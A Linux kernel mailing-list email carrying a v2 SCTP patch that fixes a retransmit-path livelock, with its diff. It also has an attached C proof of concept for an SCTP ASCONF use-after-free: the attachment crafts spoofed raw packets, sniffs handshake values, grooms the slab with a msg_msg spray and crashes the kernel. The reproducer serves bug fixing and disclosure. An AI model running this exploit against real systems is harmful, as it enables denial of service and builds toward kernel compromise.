Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9A3C0314D1A
	for <linux-sctp@vger.kernel.org>; Wed,  2 Sep 2026 02:53:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788317588; cv=none; b=bJf4ectUbcGAirf89LlMdvlNu20G+rDeYHDAUt2zm8GPJnuyXq8k2fvTMin8i5Q4c72Zn7pPZQUKO/xnTDQxONU2AMlu3F2HcOyP3pGxrjp6jRwlUEeWzxkQ3M9IX151uxqTFy628ecPefa7gd55KCIgxvcM812/Ys4Trhk7o7Q=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788317588; c=relaxed/simple;
	bh=dpuCgbdp399BvtRbYBxctf0r6zfxTLSACjrQYL0yWds=;
	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type:Content-Disposition; b=eJqnsSnf9je9NpFmCxSES7UL/ChLCTtsyCd04K0bhLkiNJExVlr0yr72/bCJfSMREZj8AyXsxH2cqQ8+LVR+/Ck174hpH5+8PLV5nfYLIllAqz9Tp7t16KUO21YkNw5YOCmP2bE5qUxE46+x7Ue8ZJq6s9WB0J7C4jDsgpxoM4w=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=bkhzQca9; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="bkhzQca9"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-398fb0feb91so81236a91.0
        for <linux-sctp@vger.kernel.org>; Tue, 01 Sep 2026 19:53:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1788317584; x=1788922384; darn=vger.kernel.org;
        h=content-transfer-encoding:content-disposition:content-type
         :mime-version:references:in-reply-to:message-id:subject:cc:to:from
         :date:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=2GqCSOLlVLGsId6mtHAUwhg+HGCjbvnLLyhmiVIgBUE=;
        b=bkhzQca9zOWpQuSgtfKx9Hzz25nhwmYY47dYYOxPEIjkulk/OxztlReCSUOw6jEyav
         HaITBV8kpzPp83xwKvTdfDMwXBz1hF32gIpYE4/fYbksz2aBWqNAiALphKoAltISOauU
         XNQcdxUFmVehacjyBmUlA8c4lLyHgmFxAPFMVCNKtVPP7IBuRGFpEbbZuxJM7TGL8KTS
         ZdtI5S3QqgyGZQdUYfQv7lPPqXIcxbzMS9Rb2sZQwY0/4k27BHs4Ezcnch7bRLlK+AGG
         1/9PVKxVUMl8mt6X6D9TFx/XHja5uvCgb6yUfsbiYRIQrRcPOqHu5yhPY4ew+nqqcHk4
         f2gw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788317584; x=1788922384;
        h=content-transfer-encoding:content-disposition:content-type
         :mime-version:references:in-reply-to:message-id:subject:cc:to:from
         :date:x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=2GqCSOLlVLGsId6mtHAUwhg+HGCjbvnLLyhmiVIgBUE=;
        b=jMaAK9OdtufEQGwTrGDh+55/BW7+Nwlo3DesIRUR+V1xpBFIr3SPlBa0Do1j2/RcHC
         f2/JWOsKZbPqrQrUah1gkjZreYTv1V842JnDk00reeweoWzOn3nqblIQWiqO8NLtepr6
         5d/9UpeCXYPqSgFOeAAalNxj7UyoSxB/reQNSq898LqWjOWQ+Kc5vlfZn9Ze9G4QhBkn
         uBbL/072CQNtaRD5ehRFpoqHCmPBhgV5J1eUOF7J433hYZ0zKivIC2+I0vBbSbWSv1k3
         7MujxJEzAfvvp0OA6kdsUu3dSrbDwk+NfqRJPST0WN+tIo9O3DHJqvELziVMDpsznGKa
         4Syw==
X-Forwarded-Encrypted: i=1; AKwUvBzug4nuFL6y876KPQaD096axALies1qoZEml7yLJMkvDTRXHUxfZ2FM84cxnq97f693vt8SNSQl6+Qy@vger.kernel.org
X-Gm-Message-State: AFuF++mVqdXaekvgukvp/vdS+yOQmTCVNRuMSNZx5RZWJjR9fNUAYZmZ
	Paacp+5QMF0Xmv4X5LY+pVygc7fCG96Mz0Pi0cyl5CH6S5awkjf7v52R
X-Gm-Gg: AYBFou3oPRwfjc9RAYAhNVTuoDmupupS7C5nc5mnMBq/nDMvjQbTmplBZ3gxGL67tyG
	+XEiqTdFN+mRB+9HeWXDP0akiPLOL6UA0mIETGaeFycwP2umNEIUf3c046+b28bpuissFnkPnt0
	cY2s3RTcnWSLddeGKoQ9wUZ/R34am+RUdTPxQOJsUyVLKgByNVNcuH109jVTMhR7I+jnp5ZhNQx
	dPz2AthJP1eelFHKRfL++YxCpPL40TGve76gjCNkIbFzdg+6ZiL2WszQdDsUuYDxPcQelYlbUJA
	aC+dLjMx1179CgHYWtF8VtIlr24C67BhSzMK4HlK1jQ1hm7dEkrYIUmubAT8wGHwvbxpSGAwIIs
	XZNe2YBBIWA5FBe5vIoysqXpChyuG2cXfrrWH6jkb/QxOshRH0CFTF4cjcghGN1ZUH3c8RU40T2
	crUEp5Wr1VWxp+fOe7sigLoMY2TzWXxPMbaRl0tvSP4trLpe4RifBJ8D4ogsPy1s3NSotaj6K91
	Bu0d5OaSOMGY38MGSY0EVS/YD648NQE0zMM
X-Received: by 2002:a17:90b:3841:b0:398:bac0:238e with SMTP id 98e67ed59e1d1-39aee24957amr1355015a91.6.1788317583823;
        Tue, 01 Sep 2026 19:53:03 -0700 (PDT)
Received: from sunyiqi-llm-kernel ([189.1.242.96])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3990d7bb7c5sm10243449a91.14.2026.09.01.19.53.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 01 Sep 2026 19:53:03 -0700 (PDT)
Date: Wed, 2 Sep 2026 10:52:06 +0800
From: Yiqi Sun <sunyiqixm@gmail.com>
To: lucien.xin@gmail.com
Cc: davem@davemloft.net, edumazet@google.com, horms@kernel.org,
	kuba@kernel.org, linux-kernel@vger.kernel.org,
	linux-sctp@vger.kernel.org, marcelo.leitner@gmail.com,
	netdev@vger.kernel.org, pabeni@redhat.com, stable@vger.kernel.org,
	sunyiqixm@gmail.com
Subject: [PATCH v2 net] sctp: avoid livelock while updating retransmit path
Message-ID: <20260902025206.phbpyxmpf4zrtdpx@sunyiqi-llm-kernel>
In-Reply-To: <CADvbK_dFoagLs1c4b-3aFqsbDueu3VO0t-8S93+6GgevuoRBLQ@mail.gmail.com>
References: <CADvbK_dFoagLs1c4b-3aFqsbDueu3VO0t-8S93+6GgevuoRBLQ@mail.gmail.com>
Precedence: bulk
X-Mailing-List: linux-sctp@vger.kernel.org
List-Id: <linux-sctp.vger.kernel.org>
List-Subscribe: <mailto:linux-sctp+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-sctp+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="jv3lfyjkrnvkybth"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit


--jv3lfyjkrnvkybth
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Thu, Aug 27, 2026 at 3:50 AM, Xin Long wrote:
> After removing the continue, I think you can keep using
> if (trans == asoc->peer.retran_path) here without 'last' needed.

Yes. The v1 'last' variable was redundant once the SCTP_UNCONFIRMED
path no longer uses continue. Drop it in this revision and retain the
original wraparound comparison after the candidate-selection block.

The reproducer is attached.

sctp_assoc_update_retran_path() walks the association transport list
from the current retransmit path's successor and stops once it reaches
the current retransmit path again. However, the loop skips transports in
SCTP_UNCONFIRMED state before checking for the wraparound condition.

This makes the loop non-terminating when the association contains only
UNCONFIRMED transports at that point and asoc->peer.retran_path is also
UNCONFIRMED. One way to reach that state is through ASCONF wildcard
DEL-IP processing after an unconfirmed address is selected as the
primary transport. sctp_assoc_del_nonprimary_peers() then removes the
other transports one by one; when removing the current retran_path,
sctp_assoc_rm_peer() calls sctp_assoc_update_retran_path() before
unlinking it. If the remaining candidate and the current retran_path are
both UNCONFIRMED, the loop repeatedly continues before it can observe
that it has completed a full pass.

Fix this by considering a transport only when it is not UNCONFIRMED,
then checking whether the walk has returned to retran_path. This makes
the full-pass termination independent of the transport state while
preserving the existing fallback selection semantics.

Also restore the NULL guard around the retran_path assignment. In the
all-UNCONFIRMED case there is no eligible replacement transport, and
installing NULL would leave later retransmit-path users and the debug
print with a NULL path.

Fixes: 4c47af4d5eb2 ("net: sctp: rework multihoming retransmission path selection to rfc4960")
Signed-off-by: Yiqi Sun <sunyiqixm@gmail.com>
---
Changes in v2:
- Drop the redundant 'last' variable as suggested by Xin Long.
- Link to v1: https://lore.kernel.org/r/20260827075006.3979566-1-sunyiqixm@gmail.com/
---
 net/sctp/associola.c | 15 ++++++++-------
 1 file changed, 8 insertions(+), 7 deletions(-)

diff --git a/net/sctp/associola.c b/net/sctp/associola.c
index c0512c827d0f..4521be3bd85a 100644
--- a/net/sctp/associola.c
+++ b/net/sctp/associola.c
@@ -1289,18 +1289,19 @@ void sctp_assoc_update_retran_path(struct sctp_association *asoc)
 		/* Manually skip the head element. */
 		if (&trans->transports == &asoc->peer.transport_addr_list)
 			continue;
-		if (trans->state == SCTP_UNCONFIRMED)
-			continue;
-		trans_next = sctp_trans_elect_best(trans, trans_next);
-		/* Active is good enough for immediate return. */
-		if (trans_next->state == SCTP_ACTIVE)
-			break;
+		if (trans->state != SCTP_UNCONFIRMED) {
+			trans_next = sctp_trans_elect_best(trans, trans_next);
+			/* Active is good enough for immediate return. */
+			if (trans_next->state == SCTP_ACTIVE)
+				break;
+		}
 		/* We've reached the end, time to update path. */
 		if (trans == asoc->peer.retran_path)
 			break;
 	}
 
-	asoc->peer.retran_path = trans_next;
+	if (trans_next)
+		asoc->peer.retran_path = trans_next;
 
 	pr_debug("%s: association:%p updated new path to addr:%pISpc\n",
 		 __func__, asoc, &asoc->peer.retran_path->ipaddr.sa);
-- 
2.34.1


--jv3lfyjkrnvkybth
Content-Type: text/x-csrc; charset=utf-8
Content-Disposition: attachment;
	filename="cve-2026-64564-fix-verifier-sctp-cpu-stall-ai.c"
Content-Transfer-Encoding: 8bit

/*
 * Crash PoC for CVE-2026-64564 — SCTP ASCONF DEL-IP Use-After-Free
 *
 * Vulnerability
 * -------------
 * sctp_process_asconf_param() (net/sctp/sm_make_chunk.c) caches the transport
 * the ASCONF chunk is processed against in asconf->transport.  This is the
 * peer transport matching the ASCONF's leading Address Parameter L, set during
 * reception via __sctp_rcv_asconf_lookup() (net/sctp/input.c).
 *
 * The DEL-IP case rejects deleting the packet *source* address (ADDIP D8,
 * SCTP_ERROR_DEL_SRC_IP) but, on unpatched kernels, nothing protects
 * asconf->transport itself.  A single ASCONF can therefore carry, in order:
 *
 *     [Address Parameter L] [DEL-IP L] [DEL-IP 0.0.0.0]
 *
 * where L differs from the packet source.  The DEL-IP for L passes the D8
 * check and calls sctp_assoc_rm_peer() on the transport that asconf->transport
 * still points at, freeing it (RCU-deferred via call_rcu).  The following
 * wildcard DEL-IP then reuses the now-dangling asconf->transport in
 * sctp_assoc_set_primary() and sctp_assoc_del_nonprimary_peers():
 *   - set_primary() dereferences the freed transport (->ipaddr, ->state, ->cacc)
 *     and plants the dangling pointer into asoc->peer.primary_path / active_path.
 *   - del_nonprimary_peers(), keeping only the pointer that is no longer on the
 *     list, removes every real transport, leaving transport_count == 0 and
 *     primary_path/active_path pointing at freed memory.
 *
 * The fix (sm_make_chunk.c) adds:
 *     if (peer == asconf->transport)
 *         return SCTP_ERROR_REQ_REFUSED;
 * before sctp_assoc_rm_peer(), so the wildcard branch can never reuse a freed
 * transport.
 *
 * This PoC triggers the UAF and then dereferences the dangling pointer to
 * crash the kernel.
 *
 * Build:  gcc -o poc poc.c -static
 *   alt:  gcc -o poc poc.c
 * Run:    ./poc
 *
 * Requires CONFIG_USER_NS=y (unprivileged user namespaces).
 * Target: Linux 6.6 kernel (before/after the fix).
 */

#define _GNU_SOURCE
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

/* ---- network constants ---- */
#define VPORT 20000                       /* server (victim) SCTP port */
#define BPORT 20001                       /* client (peer) SCTP port    */
#define LOOP  htonl(0x7f000001)           /* 127.0.0.1 — server address */
#define SRCB  htonl(0x7f000009)           /* 127.0.0.9 — spoofed source (blackholed) */
#define L_IP  0x7f000003                   /* 127.0.0.3 — DEL-IP target (a peer transport) */

/* ---- SCTP UAPI constants (avoid header conflicts) ---- */
#define SOL_SCTP_        132
#define SCTP_BINDX_ADD   100
#define SCTP_STATUS_     14

/* ASCONF chunk type and parameter types (network byte order via p16/p32) */
#define CHUNK_ASCONF     0xC1
#define PARAM_IPV4       0x0005
#define PARAM_DEL_IP     0xC002

/* ---- small helpers ---- */

static void die(const char *m)
{
	fprintf(stderr, "fatal: %s: %s\n", m, strerror(errno));
	exit(1);
}

/* Write a string to a sysctl file. */
static void wf(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return;
	write(fd, val, strlen(val));
	close(fd);
}

/* CRC32c (Castagnoli) — SCTP checksum. */
static uint32_t crc32c(const uint8_t *p, size_t n)
{
	uint32_t c = 0xFFFFFFFF;
	for (size_t i = 0; i < n; i++) {
		c ^= p[i];
		for (int k = 0; k < 8; k++)
			c = (c & 1) ? (c >> 1) ^ 0x82F63B78 : (c >> 1);
	}
	return ~c;
}

/* Write a 16/32-bit value in network byte order, advance pointer. */
static uint8_t *p16(uint8_t *p, uint16_t v) { *(uint16_t *)p = htons(v); return p + 2; }
static uint8_t *p32(uint8_t *p, uint32_t v) { *(uint32_t *)p = v;          return p + 4; }

/* Wrap an SCTP payload in an IPv4 header (IP_HDRINCL style). */
static int ip_wrap(uint8_t *b, uint32_t src, uint32_t dst,
		   const uint8_t *x, int xl)
{
	struct iphdr *ip = (void *)b;
	memset(ip, 0, sizeof *ip);
	ip->version = 4;
	ip->ihl     = 5;
	ip->tot_len = htons(sizeof *ip + xl);
	ip->ttl     = 64;
	ip->protocol = IPPROTO_SCTP;
	ip->saddr   = src;
	ip->daddr   = dst;
	memcpy(b + sizeof *ip, x, xl);
	return sizeof *ip + xl;
}

/* ---- namespace setup ---- */

static void ns(void)
{
	uid_t u = getuid();
	gid_t g = getgid();
	char x[64];

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
		die("unshare");

	wf("/proc/self/setgroups", "deny");
	snprintf(x, sizeof x, "0 %d 1", u);  wf("/proc/self/uid_map", x);
	snprintf(x, sizeof x, "0 %d 1", g);  wf("/proc/self/gid_map", x);

	/* Enable ASCONF (ADD-IP) extension without requiring AUTH. */
	wf("/proc/sys/net/sctp/addip_enable",       "1");
	wf("/proc/sys/net/sctp/addip_noauth_enable", "1");

	/* Configure loopback inside the new network namespace. */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq f;
	memset(&f, 0, sizeof f);
	strcpy(f.ifr_name, "lo");
	struct sockaddr_in *si = (void *)&f.ifr_addr;
	si->sin_family = AF_INET;
	si->sin_addr.s_addr = LOOP;
	ioctl(s, SIOCSIFADDR, &f);
	si->sin_addr.s_addr = htonl(0xff000000);
	ioctl(s, SIOCSIFNETMASK, &f);
	f.ifr_flags = 0;
	ioctl(s, SIOCGIFFLAGS, &f);
	f.ifr_flags |= IFF_UP | IFF_RUNNING;
	ioctl(s, SIOCSIFFLAGS, &f);
	close(s);

	/* Blackhole the spoofed source so the ASCONF-ACK is dropped
	 * and cannot tear down the association from the remote side.
	 */
	setenv("PATH", "/usr/sbin:/usr/bin:/sbin:/bin", 1);
	if (system("ip route add blackhole 127.0.0.9/32 2>/dev/null")) {}
}

/* ---- ASCONF chunk crafter ---- */
/*
 * Builds a raw SCTP packet containing one ASCONF chunk:
 *
 *   [common hdr: src=BPORT dst=VPORT vtag=vt]
 *   [ASCONF chunk: type=0xC1 serial=serial]
 *   [Address Param: 127.0.0.3]          ← sets asconf->transport = transport_L
 *   [DEL-IP 127.0.0.3  (crr_id=1)]      ← frees asconf->transport (unpatched)
 *   [DEL-IP 0.0.0.0    (crr_id=2)]      ← wildcard: dereferences freed transport
 *
 * The CRC32c checksum is computed and stored.
 */
static int build_asconf(uint8_t *pk, uint32_t vt, uint32_t serial)
{
	uint8_t *p = pk;

	/* SCTP common header (12 bytes) */
	p = p16(p, BPORT);     /* source port     */
	p = p16(p, VPORT);     /* dest port       */
	p = p32(p, vt);        /* verification tag */
	p = p32(p, 0);         /* checksum (filled last) */

	/* ASCONF chunk header (4 bytes) + serial (4 bytes) */
	uint8_t *chunk = p;
	*p++ = CHUNK_ASCONF;   /* chunk type  */
	*p++ = 0;               /* flags       */
	p += 2;                 /* length (filled below) */
	p = p32(p, htonl(serial));

	/* Address Parameter TLV — 127.0.0.3
	 * This determines asconf->transport (the transport to be freed).
	 */
	p = p16(p, PARAM_IPV4);
	p = p16(p, 8);
	p = p32(p, htonl(L_IP));

	/* DEL-IP parameter 1 — delete 127.0.0.3
	 * On unpatched kernels this frees asconf->transport because
	 * peer == asconf->transport and the guard is absent.
	 */
	p = p16(p, PARAM_DEL_IP);
	p = p16(p, 16);          /* param length: 4 hdr + 4 crr_id + 8 addr */
	p = p32(p, htonl(1));    /* crr_id */
	p = p16(p, PARAM_IPV4);
	p = p16(p, 8);
	p = p32(p, htonl(L_IP));

	/* DEL-IP parameter 2 — wildcard 0.0.0.0
	 * Enters the is_any() branch which calls:
	 *   sctp_assoc_set_primary(asoc, asconf->transport)      ← UAF
	 *   sctp_assoc_del_nonprimary_peers(asoc, asconf->transport)
	 * dereferencing the now-freed asconf->transport.
	 */
	p = p16(p, PARAM_DEL_IP);
	p = p16(p, 16);
	p = p32(p, htonl(2));    /* crr_id */
	p = p16(p, PARAM_IPV4);
	p = p16(p, 8);
	p = p32(p, htonl(0));    /* 0.0.0.0 = wildcard */

	/* Fill in chunk length */
	*(uint16_t *)(chunk + 2) = htons((uint16_t)(p - chunk));

	/* Compute and store CRC32c over the entire SCTP packet */
	int len = p - pk;
	uint32_t crc = crc32c(pk, len);
	memcpy(pk + 8, &crc, 4);
	return len;
}

/* ---- handshake sniffer ---- */
/*
 * Sniffs the 4-way SCTP handshake on loopback to extract:
 *   - vtag:  the server's init-tag (from INIT-ACK), needed in the common header
 *   - tsn:   the client's initial TSN (from INIT), needed as the ASCONF serial
 *            (serial must equal asoc->peer.addip_serial + 1 == initial_tsn)
 */
static void sniff_handshake(int wfd)
{
	int ps = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
	struct sockaddr_ll ll = {
		.sll_family   = AF_PACKET,
		.sll_protocol = htons(ETH_P_IP),
		.sll_ifindex  = (int)if_nametoindex("lo"),
	};
	bind(ps, (void *)&ll, sizeof ll);

	uint32_t vtag = 0, tsn = 0;
	int got_vtag = 0, got_tsn = 0;

	for (int i = 0; i < 9000 && !(got_vtag && got_tsn); i++) {
		uint8_t pk[2048];
		ssize_t n = recv(ps, pk, sizeof pk, 0);
		if (n < 28) continue;
		int ih = (pk[0] & 0xf) * 4;          /* IP header length */
		if (n < ih + 32) continue;
		uint16_t sp = ntohs(*(uint16_t *)(pk + ih));       /* SCTP src port */
		uint16_t dp = ntohs(*(uint16_t *)(pk + ih + 2));   /* SCTP dst port */
		uint8_t  ct = pk[ih + 12];                           /* chunk type   */

		/* INIT (type 1) from client → server: extract initial TSN
		 * Chunk body starts at ih+12+4; initial_tsn at body+12 = ih+12+16.
		 */
		if (sp == BPORT && dp == VPORT && ct == 1) {
			tsn = ntohl(*(uint32_t *)(pk + ih + 12 + 16));
			got_tsn = 1;
		}
		/* INIT-ACK (type 2) from server → client: extract init tag
		 * init_tag is the first field of the chunk body = ih+12+4.
		 */
		if (sp == VPORT && dp == BPORT && ct == 2) {
			vtag = *(uint32_t *)(pk + ih + 12 + 4);
			got_vtag = 1;
		}
	}

	uint32_t out[2] = { vtag, tsn };
	write(wfd, out, sizeof out);
	_exit(0);
}

/* ---- client peer ---- */
/*
 * Creates the multihomed SCTP association from the client side.
 * Binds three addresses (127.0.0.1, 127.0.0.2, 127.0.0.3) so the server
 * sees three peer transports.  After DEL-IP 127.0.0.3, transport_count
 * drops to 2, allowing the wildcard DEL-IP to proceed (it requires
 * transport_count > 1 to pass the DEL_LAST_IP check).
 */
static void peer_b(struct sockaddr_in vaddr)
{
	int one = 1;
	int b = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if (b < 0) die("peer socket");
	setsockopt(b, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

	/* Primary bind to 127.0.0.1 */
	struct sockaddr_in bv = {
		.sin_family = AF_INET,
		.sin_port   = htons(BPORT),
		.sin_addr.s_addr = LOOP,
	};
	if (bind(b, (void *)&bv, sizeof bv) < 0) die("peer bind");

	/* Add 127.0.0.2 and 127.0.0.3 as additional bind addresses.
	 * Together with the primary bind this gives 3 peer transports.
	 */
	for (int i = 0; i < 2; i++) {
		struct sockaddr_in ad = {
			.sin_family = AF_INET,
			.sin_port   = htons(BPORT),
			.sin_addr.s_addr = htonl(0x7f000002 + i),
		};
		setsockopt(b, SOL_SCTP_, SCTP_BINDX_ADD, &ad, sizeof ad);
	}

	usleep(120000);
	if (connect(b, (void *)&vaddr, sizeof vaddr) < 0)
		die("connect");

	/* Keep the association alive. */
	pause();
}

/* ---- msg_msg spray (kmalloc-1024 reclaim) ---- */
/*
 * After the RCU grace period, the freed transport memory is returned to the
 * slab.  Spraying kmalloc-1024 objects overwrites the freed slot with
 * controlled data so that subsequent dereferences of the dangling
 * primary_path/active_path pointer access garbage and fault.
 */
#define MSG_DATA 976   /* 48-byte msg_msg header + 976 = 1024 (kmalloc-1024) */
static int g_msq[64];
static int g_nmsq = 0;

static void msg_spray(void)
{
	struct { long mtype; char mtext[MSG_DATA]; } mb;
	mb.mtype = 1;
	memset(mb.mtext, 0x41, sizeof mb.mtext);

	for (int i = 0; i < 64; i++) {
		int q = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		if (q < 0) break;
		g_msq[g_nmsq++] = q;
		for (int k = 0; k < 64; k++)
			if (msgsnd(q, &mb, sizeof mb.mtext, IPC_NOWAIT) != 0)
				break;
	}
}

/* ---- SCTP status struct for getsockopt trigger ---- */
struct paddrinfo {
	uint32_t spinfo_assoc_id;
	uint8_t  spinfo_address[128];
	int32_t  spinfo_state;
	uint32_t spinfo_cwnd;
	uint32_t spinfo_srtt;
	uint32_t spinfo_rto;
	uint32_t spinfo_mtu;
} __attribute__((packed, aligned(4)));

struct sctp_status_ {
	uint32_t sstat_assoc_id;
	int32_t  sstat_state;
	uint32_t sstat_rwnd;
	uint16_t sstat_unackdata;
	uint16_t sstat_penddata;
	uint16_t sstat_instrms;
	uint16_t sstat_outstrms;
	uint32_t sstat_fragmentation_point;
	struct paddrinfo sstat_primary;
};

/* ---- main ---- */
int main(void)
{
	signal(SIGPIPE, SIG_IGN);
	setbuf(stdout, NULL);

	/* Pin to CPU 0 so RCU frees land on one per-CPU freelist. */
	cpu_set_t cs;
	CPU_ZERO(&cs);
	CPU_SET(0, &cs);
	sched_setaffinity(0, sizeof cs, &cs);

	ns();
	printf("[*] namespace ready\n");

	/* --- server (victim) socket --- */
	int one = 1;
	int L = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if (L < 0) die("server socket");
	setsockopt(L, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

	struct sockaddr_in vaddr = {
		.sin_family = AF_INET,
		.sin_port   = htons(VPORT),
		.sin_addr.s_addr = LOOP,
	};
	if (bind(L, (void *)&vaddr, sizeof vaddr) < 0) die("server bind");
	if (listen(L, 8) < 0) die("listen");

	/* --- fork handshake sniffer --- */
	int pfd[2];
	pipe(pfd);
	if (fork() == 0) { close(pfd[0]); sniff_handshake(pfd[1]); }

	/* --- fork client peer --- */
	if (fork() == 0) { close(pfd[0]); close(pfd[1]); peer_b(vaddr); }
	close(pfd[1]);

	/* --- accept the association --- */
	struct pollfd pf = { .fd = L, .events = POLLIN };
	if (poll(&pf, 1, 5000) <= 0) { fprintf(stderr, "accept timeout\n"); return 1; }
	int A = accept(L, NULL, NULL);
	if (A < 0) die("accept");

	/* --- read vtag and initial_tsn from sniffer --- */
	uint32_t in[2];
	if (read(pfd[0], in, sizeof in) != sizeof in) {
		fprintf(stderr, "sniff failed\n");
		return 1;
	}
	uint32_t vtag = in[0], tsn = in[1];
	printf("[*] vtag=0x%08x  initial_tsn=0x%08x\n", vtag, tsn);

	/* Let the association stabilise (transports are created during
	 * the 4-way handshake; accept() returns once it completes).
	 */
	usleep(200000);
	printf("[*] association established with 3 peer transports\n");

	/* --- send the malicious ASCONF --- */
	printf("[*] sending ASCONF [Addr 127.0.0.3][DEL-IP 127.0.0.3][DEL-IP 0.0.0.0]...\n");

	int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (raw < 0) die("raw socket");
	setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);

	uint8_t sctp[256], ip[400];
	int sl = build_asconf(sctp, vtag, tsn);
	int il = ip_wrap(ip, SRCB, LOOP, sctp, sl);

	struct sockaddr_in dst = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = LOOP,
	};
	if (sendto(raw, ip, il, 0, (void *)&dst, sizeof dst) < 0)
		die("sendto");
	close(raw);

	printf("[*] ASCONF sent — UAF triggered on unpatched kernel\n");

	/* --- wait for the RCU grace period so the transport is actually freed --- */
	/* MEMBARRIER_CMD_SHARED = 1; this blocks until all CPUs have passed a
	 * grace period, guaranteeing the call_rcu callback (kfree) has run.
	 */
	syscall(SYS_membarrier, 1, 0, -1);
	usleep(100000);

	/* --- reclaim the freed transport memory with controlled data --- */
	printf("[*] spraying msg_msg (kmalloc-1024) to reclaim freed transport...\n");
	msg_spray();
	usleep(50000);

	/* --- trigger dereference of the dangling primary_path / active_path --- */
	printf("[*] attempting to dereference dangling pointers...\n");

	/* (a) getsockopt SCTP_STATUS — reads primary_path->ipaddr, ->state, etc. */
	struct sctp_status_ st;
	memset(&st, 0, sizeof st);
	socklen_t sl_opt = sizeof st;
	getsockopt(A, SOL_SCTP_, SCTP_STATUS_, &st, &sl_opt);

	/* (b) send — routes via active_path (dangling) */
	send(A, "x", 1, MSG_DONTWAIT | MSG_NOSIGNAL);

	/* (c) close — association teardown dereferences primary_path */
	close(A);

	/* If we reach here the dereference did not fault (e.g. freed memory
	 * was not yet reclaimed, or KASAN/SLUB debug is off).  The UAF was
	 * still triggered — the association is corrupted (transport_count == 0,
	 * primary_path dangling).  A subsequent operation or timer will crash.
	 */
	printf("[!] survived immediate dereference — UAF is triggered but\n"
	       "    the freed slot was not yet reclaimed at the time of access.\n"
	       "    The association is corrupted; a crash is imminent.\n");
	sleep(3);
	return 0;
}

--jv3lfyjkrnvkybth--
